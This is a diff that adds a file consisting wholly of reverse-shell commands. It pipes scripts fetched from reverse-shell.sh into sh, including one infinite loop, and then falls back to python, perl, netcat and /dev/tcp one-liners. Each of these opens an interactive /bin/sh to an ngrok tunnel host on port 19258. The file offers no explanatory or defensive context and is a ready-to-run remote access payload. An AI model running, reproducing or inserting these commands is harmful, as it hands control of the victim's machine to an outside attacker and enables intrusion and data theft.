@@ -1,1 +1,28 @@
+curl https://reverse-shell.sh/0.tcp.ap.ngrok.io:19258 | sh
 
+wget -qO- https://reverse-shell.sh/0.tcp.ap.ngrok.io:19258 | sh
+
+curl -fsSL https://reverse-shell.sh/0.tcp.ap.ngrok.io:19258 | sh
+busybox wget -qO- https://reverse-shell.sh/0.tcp.ap.ngrok.io:19258 | sh
+
+while true; do curl https://reverse-shell.sh/0.tcp.ap.ngrok.io:19258 | sh; done
+
+if command -v python > /dev/null 2>&1; then
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("0.tcp.ap.ngrok.io",19258)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'
+    exit;
+fi
+
+if command -v perl > /dev/null 2>&1; then
+    perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=19258;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    exit;
+fi
+
+if command -v nc > /dev/null 2>&1; then
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 19258 >/tmp/f
+    exit;
+fi
+
+if command -v sh > /dev/null 2>&1; then
+    /bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/19258 0>&1
+    exit;
+fi
